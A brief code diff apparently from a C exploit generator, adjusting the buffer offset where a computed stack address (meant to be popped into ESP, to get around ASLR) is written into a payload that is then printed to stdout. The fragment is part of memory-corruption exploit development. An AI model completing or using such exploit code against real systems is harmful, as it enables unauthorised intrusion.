@@ -209,7 +209,7 @@ main(int argc, char **argv)
 
 	// Value to pop into Esp
 	addr_aslr = staddr - 0x5c;
-	memcpy(payload + 56, &addr_aslr, sizeof(addr_aslr));
+	memcpy(payload + 60, &addr_aslr, sizeof(addr_aslr));
 
 	/*
 	 * dump the payload in 'stdout'
